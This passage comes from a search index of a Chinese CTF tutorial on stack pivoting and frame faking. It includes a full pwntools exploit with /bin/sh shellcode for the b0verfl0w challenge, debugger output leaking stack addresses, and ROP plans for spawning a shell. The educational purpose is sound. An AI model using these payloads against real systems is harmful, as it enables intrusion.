\u9700\u8981\u6ce8\u610f\u7684\u662f, \u8fd9\u79cd\u6280\u5de7\u4e0d\u6b62\u5728\u6808\u4e0a\u6709\u6548, \u5728\u5806\u4e0a\u4e5f\u662f\u4e00\u79cd\u6709\u6548\u7684\u7ed5\u8fc7\u5730\u5740\u968f\u673a\u5316\u7684\u624b\u6bb5 \u9898\u76ee \u00b6","title":"\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7"},{"location":"pwn/stackoverflow/others/#_1","text":"","title":"\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7"},{"location":"pwn/stackoverflow/others/#stack-pivoting","text":"","title":"stack pivoting"},{"location":"pwn/stackoverflow/others/#_2","text":"stack pivoting\uff0c\u6b63\u5982\u5b83\u6240\u63cf\u8ff0\u7684\uff0c\u8be5\u6280\u5de7\u5c31\u662f\u52ab\u6301\u6808\u6307\u9488\u6307\u5411\u653b\u51fb\u8005\u6240\u80fd\u63a7\u5236\u7684\u5185\u5b58\u5904\uff0c\u7136\u540e\u518d\u5728\u76f8\u5e94\u7684\u4f4d\u7f6e\u8fdb\u884c ROP\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5728\u4ee5\u4e0b\u60c5\u51b5\u9700\u8981\u4f7f\u7528 stack pivoting \u53ef\u4ee5\u63a7\u5236\u7684\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u6570\u8f83\u5c11\uff0c\u96be\u4ee5\u6784\u9020\u8f83\u957f\u7684 ROP \u94fe \u5f00\u542f\u4e86 PIE \u4fdd\u62a4\uff0c\u6808\u5730\u5740\u672a\u77e5\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6808\u52ab\u6301\u5230\u5df2\u77e5\u7684\u533a\u57df\u3002 \u5176\u5b83\u6f0f\u6d1e\u96be\u4ee5\u5229\u7528\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8f6c\u6362\uff0c\u6bd4\u5982\u8bf4\u5c06\u6808\u52ab\u6301\u5230\u5806\u7a7a\u95f4\uff0c\u4ece\u800c\u5728\u5806\u4e0a\u5199 top \u53ca\u8fdb\u884c\u5806\u6f0f\u6d1e\u5229\u7528 \u6b64\u5916\uff0c\u5229\u7528 stack pivoting \u6709\u4ee5\u4e0b\u51e0\u4e2a\u8981\u6c42 \u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002 \u53ef\u4ee5\u63a7\u5236 sp \u6307\u9488\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u63a7\u5236\u6808\u6307\u9488\u4f1a\u4f7f\u7528 ROP\uff0c\u5e38\u89c1\u7684\u63a7\u5236\u6808\u6307\u9488\u7684 gadgets \u4e00\u822c\u662f pop rsp / esp \u5f53\u7136\uff0c\u8fd8\u4f1a\u6709\u4e00\u4e9b\u5176\u5b83\u7684\u59ff\u52bf\u3002\u6bd4\u5982\u8bf4 libc_csu_init \u4e2d\u7684 gadgets\uff0c\u6211\u4eec\u901a\u8fc7\u504f\u79fb\u5c31\u53ef\u4ee5\u5f97\u5230\u63a7\u5236 rsp \u6307\u9488\u3002\u4e0a\u9762\u7684\u662f\u6b63\u5e38\u7684\uff0c\u4e0b\u9762\u7684\u662f\u504f\u79fb\u7684\u3002 gef \u27a4 x / 7 i 0x000000000040061a 0 x40061a < __libc_csu_init + 90 > : pop rbx 0 x40061b < __libc_csu_init + 91 > : pop rbp 0 x40061c < __libc_csu_init + 92 > : pop r12 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret gef \u27a4 x / 7 i 0x000000000040061d 0 x40061d < __libc_csu_init + 93 > : pop rsp 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret \u6b64\u5916\uff0c\u8fd8\u6709\u66f4\u52a0\u9ad8\u7ea7\u7684 fake frame\u3002 \u5b58\u5728\u53ef\u4ee5\u63a7\u5236\u5185\u5bb9\u7684\u5185\u5b58\uff0c\u4e00\u822c\u6709\u5982\u4e0b bss \u6bb5\u3002\u7531\u4e8e\u8fdb\u7a0b\u6309\u9875\u5206\u914d\u5185\u5b58\uff0c\u5206\u914d\u7ed9 bss \u6bb5\u7684\u5185\u5b58\u5927\u5c0f\u81f3\u5c11\u4e00\u4e2a\u9875(4k\uff0c0x1000)\u5927\u5c0f\u3002\u7136\u800c\u4e00\u822cbss\u6bb5\u7684\u5185\u5bb9\u7528\u4e0d\u4e86\u8fd9\u4e48\u591a\u7684\u7a7a\u95f4\uff0c\u5e76\u4e14 bss \u6bb5\u5206\u914d\u7684\u5185\u5b58\u9875\u62e5\u6709\u8bfb\u5199\u6743\u9650\u3002 heap\u3002\u4f46\u662f\u8fd9\u4e2a\u9700\u8981\u6211\u4eec\u80fd\u591f\u6cc4\u9732\u5806\u5730\u5740\u3002","title":"\u539f\u7406"},{"location":"pwn/stackoverflow/others/#_3","text":"","title":"\u793a\u4f8b"},{"location":"pwn/stackoverflow/others/#1","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 X-CTF Quals 2016 - b0verfl0w \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u67e5\u770b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4\uff0c\u5982\u4e0b \u279c X-CTF Quals 2016 - b0verfl0w git: ( iromise ) \u2717 checksec b0verfl0w Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE ( 0x8048000 ) RWX: Has RWX segments \u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u4e3a 32 \u4f4d\uff0c\u4e5f\u6ca1\u6709\u5f00\u542f NX \u4fdd\u62a4\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u627e\u4e00\u4e0b\u7a0b\u5e8f\u7684\u6f0f\u6d1e signed int vul () { char s ; // [sp+18h] [bp-20h]@1 puts ( \" \\n ======================\" ); puts ( \" \\n Welcome to X-CTF 2016!\" ); puts ( \" \\n ======================\" ); puts ( \"What's your name?\" ); fflush ( stdout ); fgets ( & s , 50 , stdin ); printf ( \"Hello %s.\" , & s ); fflush ( stdout ); return 1 ; } \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u4f46\u662f\u5176\u6240\u80fd\u6ea2\u51fa\u7684\u5b57\u8282\u5c31\u53ea\u6709 50-0x20-4=14 \u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u6267\u884c\u4e00\u4e9b\u6bd4\u8f83\u597d\u7684 ROP\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u8003\u8651 stack pivoting \u3002\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u5e76\u6ca1\u6709\u5f00\u542f\u5806\u6808\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728\u6808\u4e0a\u5e03\u7f6eshellcode \u5e76\u6267\u884c\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528\u6808\u6ea2\u51fa\u5e03\u7f6e shellcode \u63a7\u5236 eip \u6307\u5411 shellcode\u5904 \u7b2c\u4e00\u6b65\uff0c\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u5730\uff0c\u76f4\u63a5\u8bfb\u53d6\u5373\u53ef\uff0c\u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u4f1a\u5f00\u542f ASLR \u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u76f4\u63a5\u77e5\u9053shellcode \u7684\u5730\u5740\u3002\u4f46\u662f\u6808\u4e0a\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u5bf9 esp \u8fdb\u884c\u64cd\u4f5c\uff0c\u4f7f\u5176\u6307\u5411 shellcode\u5904\uff0c\u5e76\u4e14\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u81f3 esp\u5904\u3002\u90a3\u4e0b\u9762\u5c31\u662f\u627e\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u5230 esp \u5904\u7684 gadgets \u4e86\u3002 \u279c X-CTF Quals 2016 - b0verfl0w git: ( iromise ) \u2717 ROPgadget --binary b0verfl0w --only 'jmp|ret' Gadgets information ============================================================ 0x08048504 : jmp esp 0x0804836a : ret 0x0804847e : ret 0xeac1 Unique gadgets found: 3 \u8fd9\u91cc\u6211\u4eec\u53d1\u73b0\u6709\u4e00\u4e2a\u53ef\u4ee5\u76f4\u63a5\u8df3\u8f6c\u5230 esp \u7684 gadgets\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5e03\u7f6e payload \u5982\u4e0b shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp \u90a3\u4e48\u6211\u4eec payload \u4e2d\u7684\u6700\u540e\u4e00\u90e8\u5206\u6539\u5982\u4f55\u8bbe\u7f6e esp \u5462\uff0c\u53ef\u4ee5\u77e5\u9053 size(shellcode+padding)=0x20 size(fake ebp)=0x4 size(0x08048504)=0x4 \u6240\u4ee5\u6211\u4eec\u6700\u540e\u4e00\u6bb5\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u5c31\u662f sub 0x28 , esp jmp esp \u6240\u4ee5\u6700\u540e\u7684 exp \u5982\u4e0b from pwn import * sh = process ( './b0verfl0w' ) shellcode_x86 = \" \\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73 \" shellcode_x86 += \" \\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0 \" shellcode_x86 += \" \\x0b\\xcd\\x80 \" sub_esp_jmp = asm ( 'sub esp, 0x28;jmp esp' ) jmp_esp = 0x08048504 payload = shellcode_x86 + ( 0x20 - len ( shellcode_x86 )) * 'b' + 'bbbb' + p32 ( jmp_esp ) + sub_esp_jmp sh . sendline ( payload ) sh . interactive ()","title":"\u4f8b1"},{"location":"pwn/stackoverflow/others/#2-","text":"\u5f85\u3002","title":"\u4f8b2-\u8f6c\u79fb\u5806"},{"location":"pwn/stackoverflow/others/#_4","text":"EkoPartyCTF 2016 fuckzing-exploit-200","title":"\u9898\u76ee"},{"location":"pwn/stackoverflow/others/#frame-faking","text":"\u6b63\u5982\u8fd9\u4e2a\u6280\u5de7\u540d\u5b57\u6240\u8bf4\u7684\u90a3\u6837\uff0c\u8fd9\u4e2a\u6280\u5de7\u5c31\u662f\u6784\u9020\u4e00\u4e2a\u865a\u5047\u7684\u6808\u5e27\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002","title":"frame faking"},{"location":"pwn/stackoverflow/others/#_5","text":"\u6982\u62ec\u5730\u8bb2\uff0c\u6211\u4eec\u5728\u4e4b\u524d\u8bb2\u7684\u6808\u6ea2\u51fa\u4e0d\u5916\u4e4e\u4e24\u79cd\u65b9\u5f0f \u63a7\u5236\u7a0b\u5e8f EIP \u63a7\u5236\u7a0b\u5e8f EBP \u5176\u6700\u7ec8\u90fd\u662f\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u5728 frame faking \u4e2d\uff0c\u6211\u4eec\u6240\u5229\u7528\u7684\u6280\u5de7\u4fbf\u662f\u540c\u65f6\u63a7\u5236 EBP \u4e0e EIP\uff0c\u8fd9\u6837\u6211\u4eec\u5728\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7684\u540c\u65f6\uff0c\u4e5f\u6539\u53d8\u7a0b\u5e8f\u6808\u5e27\u7684\u4f4d\u7f6e\u3002\u4e00\u822c\u6765\u8bf4\u5176 payload \u5982\u4e0b buffer padding|fake ebp|leave ret addr| \u5373\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u5c06\u6808\u4e0a\u6784\u9020\u4e3a\u5982\u4e0a\u683c\u5f0f\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8bb2\u4e0b\u540e\u9762\u4e24\u4e2a\u90e8\u5206 \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u88ab\u6211\u4eec\u8986\u76d6\u4e3a\u6267\u884c leave ret \u7684\u5730\u5740\uff0c\u8fd9\u5c31\u8868\u660e\u4e86\u51fd\u6570\u5728\u6b63\u5e38\u6267\u884c\u5b8c\u81ea\u5df1\u7684 leave ret \u540e\uff0c\u8fd8\u4f1a\u518d\u6b21\u6267\u884c\u4e00\u6b21 leave ret\u3002 \u5176\u4e2d fake ebp \u4e3a\u6211\u4eec\u6784\u9020\u7684\u6808\u5e27\u7684\u57fa\u5730\u5740\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u662f\u4e00\u4e2a\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u6784\u9020\u7684\u5047\u7684\u6808\u5e27\u5982\u4e0b fake ebp | v ebp2|target function addr|leave ret addr|arg1|arg2 \u8fd9\u91cc\u6211\u4eec\u7684 fake ebp \u6307\u5411 ebp2\uff0c\u5373\u5b83\u4e3a ebp2 \u6240\u5728\u7684\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u91cc\u90fd\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u53ef\u8bfb\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u7684\u6c47\u7f16\u8bed\u6cd5\u662f AT&T \u8bed\u6cd5\u3002 \u5728\u6211\u4eec\u4ecb\u7ecd\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u6709\u5fc5\u8981\u8bf4\u4e00\u4e0b\uff0c\u51fd\u6570\u7684\u5165\u53e3\u70b9\u4e0e\u51fa\u53e3\u70b9\u7684\u57fa\u672c\u64cd\u4f5c \u5165\u53e3\u70b9 push ebp # \u5c06ebp\u538b\u6808 move esp, ebp #\u5c06esp\u7684\u503c\u8d4b\u7ed9ebp \u51fa\u53e3\u70b9 leave ret #pop eip\uff0c\u5f39\u51fa\u6808\u9876\u5143\u7d20\u4f5c\u4e3a\u7a0b\u5e8f\u4e0b\u4e00\u4e2a\u6267\u884c\u5730\u5740 \u5176\u4e2d leave \u6307\u4ee4\u76f8\u5f53\u4e8e move ebp, esp # \u5c06ebp\u7684\u503c\u8d4b\u7ed9esp pop ebp #\u5f39\u51faebp \u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u8bf4\u4e00\u4e0b\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u3002 \u5728\u6709\u6808\u6ea2\u51fa\u7684\u7a0b\u5e8f\u6267\u884c leave \u65f6\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4 move ebp, esp \uff0c\u8fd9\u4f1a\u5c06 esp \u4e5f\u6307\u5411\u5f53\u524d\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684 ebp \u57fa\u5730\u5740\u5904\u3002 pop ebp\uff0c \u8fd9\u4f1a\u5c06\u6808\u4e2d\u5b58\u653e\u7684 fake ebp \u7684\u503c\u8d4b\u7ed9 ebp\u3002\u5373\u6267\u884c\u5b8c\u6307\u4ee4\u4e4b\u540e\uff0cebp\u4fbf\u6307\u5411\u4e86ebp2\uff0c\u4e5f\u5c31\u662f\u4fdd\u5b58\u4e86 ebp2 \u6240\u5728\u7684\u5730\u5740\u3002 \u6267\u884c ret \u6307\u4ee4\uff0c\u4f1a\u518d\u6b21\u6267\u884c leave ret \u6307\u4ee4\u3002 \u6267\u884c leave \u6307\u4ee4\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4 move ebp, esp \uff0c\u8fd9\u4f1a\u5c06 esp \u6307\u5411 ebp2\u3002 pop ebp\uff0c\u6b64\u65f6\uff0c\u4f1a\u5c06 ebp \u7684\u5185\u5bb9\u8bbe\u7f6e\u4e3a ebp2 \u7684\u503c\uff0c\u540c\u65f6 esp \u4f1a\u6307\u5411 target function\u3002 \u6267\u884c ret \u6307\u4ee4\uff0c\u8fd9\u65f6\u5019\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c target function\uff0c\u5f53\u5176\u8fdb\u884c\u7a0b\u5e8f\u7684\u65f6\u5019\u4f1a\u6267\u884c push ebp\uff0c\u4f1a\u5c06 ebp2 \u503c\u538b\u5165\u6808\u4e2d\uff0c move esp, ebp\uff0c\u5c06 ebp \u6307\u5411\u5f53\u524d\u57fa\u5730\u5740\u3002 \u6b64\u65f6\u7684\u6808\u7ed3\u6784\u5982\u4e0b ebp | v ebp2|leave ret addr|arg1|arg2 \u5f53\u7a0b\u5e8f\u6267\u884c\u5e08\uff0c\u5176\u4f1a\u6b63\u5e38\u7533\u8bf7\u7a7a\u95f4\uff0c\u540c\u65f6\u6211\u4eec\u5728\u6808\u4e0a\u4e5f\u5b89\u6392\u4e86\u8be5\u51fd\u6570\u5bf9\u5e94\u7684\u53c2\u6570\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\u3002 \u7a0b\u5e8f\u7ed3\u675f\u540e\uff0c\u5176\u53c8\u4f1a\u6267\u884c\u4e24\u6b21 leave ret addr\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u5728 ebp2 \u5904\u5e03\u7f6e\u597d\u4e86\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4e00\u76f4\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u53ef\u4ee5\u770b\u51fa\u5728 fake frame \u4e2d\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u9700\u6c42\u5c31\u662f\uff0c\u6211\u4eec\u5fc5\u987b\u5f97\u6709\u4e00\u5757\u53ef\u4ee5\u5199\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u6211\u4eec\u8fd8\u77e5\u9053\u8fd9\u5757\u5185\u5b58\u7684\u5730\u5740\uff0c\u8fd9\u4e00\u70b9\u4e0e stack pivoting \u76f8\u4f3c\u3002","title":"\u539f\u7406"},{"location":"pwn/stackoverflow/others/#_6","text":"\u4ee5 2018 \u5e74 6 \u6708\u5b89\u6052\u676f\u6708\u8d5b\u7684 over \u4e00\u9898\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd, \u9898\u76ee\u53ef\u4ee5\u5728 ctf-challenge \u4e2d\u627e\u5230","title":"\u4f8b\u5b50"},{"location":"pwn/stackoverflow/others/#_7","text":"over.over: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 99beb778a74c68e4ce1477b559391e860dd0e946, stripped [ * ] '/home/m4x/pwn_repo/others_over/over.over' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f, \u6ca1\u6709\u5f00 PIE \u548c canary \u4fdd\u62a4, \u4f46\u5f00\u4e86 NX \u4fdd\u62a4","title":"\u6587\u4ef6\u4fe1\u606f"},{"location":"pwn/stackoverflow/others/#_8","text":"\u653e\u5230 IDA \u4e2d\u8fdb\u884c\u5206\u6790 __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { setvbuf ( stdin , 0LL , 2 , 0LL ); setvbuf ( stdout , 0LL , 2 , 0LL ); while ( sub_400676 () ) ; return 0LL ; } int sub_400676 () { char buf [ 80 ]; // [rsp+0h] [rbp-50h] memset ( buf , 0 , sizeof ( buf )); putchar ( '>' ); read ( 0 , buf , 96uLL ); return puts ( buf ); } \u6f0f\u6d1e\u5f88\u660e\u663e, read \u80fd\u8bfb\u5165 96 \u4f4d, \u4f46 buf \u7684\u957f\u5ea6\u53ea\u6709 80, \u56e0\u6b64\u80fd\u8986\u76d6 rbp \u4ee5\u53ca ret addr \u4f46\u4e5f\u53ea\u80fd\u8986\u76d6\u5230 rbp \u548c ret addr, \u56e0\u6b64\u4e5f\u53ea\u80fd\u901a\u8fc7\u540c\u65f6\u63a7\u5236 rbp \u4ee5\u53ca ret addr \u6765\u8fdb\u884c rop \u4e86","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/stackoverflow/others/#leak-stack","text":"\u4e3a\u4e86\u63a7\u5236 rbp, \u6211\u4eec\u9700\u8981\u77e5\u9053\u67d0\u4e9b\u5730\u5740, \u53ef\u4ee5\u53d1\u73b0\u5f53\u8f93\u5165\u7684\u957f\u5ea6\u4e3a 80 \u65f6, \u7531\u4e8e read \u5e76\u4e0d\u4f1a\u7ed9\u8f93\u5165\u672b\u5c3e\u8865\u4e0a '\\0', rbp \u7684\u503c\u5c31\u4f1a\u88ab puts \u6253\u5370\u51fa\u6765, \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u56fa\u5b9a\u504f\u79fb\u77e5\u9053\u6808\u4e0a\u6240\u6709\u4f4d\u7f6e\u7684\u5730\u5740\u4e86 Breakpoint 1 , 0x00000000004006b9 in ?? () LEGEND : STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RBX 0x0 RCX 0x7ff756e9b690 ( __read_nocancel + 7 ) \u25c2\u2014 cmp rax , - 0xfff RDX 0x60 RDI 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RSI 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) R8 0x7ff75715b760 ( _IO_stdfile_1_lock ) \u25c2\u2014 0x0 R9 0x7ff757354700 \u25c2\u2014 0x7ff757354700 R10 0x37b R11 0x246 R12 0x400580 \u25c2\u2014 xor ebp , ebp R13 0x7ffceaf112b0 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7ffceaf111b0 \u2014\u25b8 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 RSP 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RIP 0x4006b9 \u25c2\u2014 call 0x400530 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ DISASM ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x4006b9 call puts @ plt < 0x400530 > s : 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) 0x4006be leave 0x4006bf ret 0x4006c0 push rbp 0x4006c1 mov rbp , rsp 0x4006c4 sub rsp , 0x10 0x4006c8 mov dword ptr [ rbp - 4 ], edi 0x4006cb mov qword ptr [ rbp - 0x10 ], rsi 0x4006cf mov rax , qword ptr [ rip + 0x20098a ] < 0x601060 > 0x4006d6 mov ecx , 0 0x4006db mov edx , 2 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ STACK ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00 : 0000 \u2502 rax rdi rsi rsp 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) ... \u2193 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ BACKTRACE ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba f 0 4006 b9 f 1 400715 f 2 7ff 756 de02b1 __libc_start_main + 241 Breakpoint * 0x4006B9 pwndbg > stack 15 00 : 0000 \u2502 rax rdi rsi rsp 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) ... \u2193 0 a : 0050 \u2502 rbp 0x7ffceaf111b0 \u2014\u25b8 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 0 b : 005 8 \u2502 0x7ffceaf111b8 \u2014\u25b8 0x400715 \u25c2\u2014 test eax , eax 0 c : 0060 \u2502 0x7ffceaf111c0 \u2014\u25b8 0x7ffceaf112b8 \u2014\u25b8 0x7ffceaf133db \u25c2\u2014 ' . / over . over ' 0 d : 006 8 \u2502 0x7ffceaf111c8 \u25c2\u2014 0x100000000 0 e : 0070 \u2502 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 pwndbg > distance 0x7ffceaf111d0 0x7ffceaf11160 0x7ffceaf111d0 -> 0x7ffceaf11160 is - 0x70 bytes ( - 0xe words ) leak \u51fa\u6808\u5730\u5740\u540e, \u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 rbp \u4e3a\u6808\u4e0a\u7684\u5730\u5740(\u5982 0x7ffceaf11160), ret addr \u4e3a leave ret \u7684\u5730\u5740\u6765\u5b9e\u73b0\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u4e86, \u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u5728 0x7ffceaf11160 + 0x8 \u586b\u4e0a leak libc \u7684 rop chain \u5e76\u63a7\u5236\u5176\u8fd4\u56de\u5230 sub_400676 \u51fd\u6570\u6765 leak libc, \u7136\u540e\u5728\u4e0b\u4e00\u6b21\u5229\u7528\u65f6\u5c31\u53ef\u4ee5\u901a\u8fc7 rop \u6267\u884c system(\"/bin/sh\") \u6216 execve(\"/bin/sh\", 0, 0)\u6765 get shell \u4e86, \u8fd9\u9053\u9898\u76ee\u56e0\u4e3a\u8f93\u5165\u7684\u957f\u5ea6\u8db3\u591f, \u6211\u4eec\u53ef\u4ee5\u5e03\u7f6e\u8c03\u7528 execve(\"/bin/sh\", 0, 0) \u7684\u5229\u7528\u94fe, \u8fd9\u79cd\u65b9\u6cd5\u66f4\u7a33\u59a5(system(\"/bin/sh\") \u53ef\u80fd\u4f1a\u56e0\u4e3a env \u88ab\u7834\u574f\u800c\u5931\u6548), 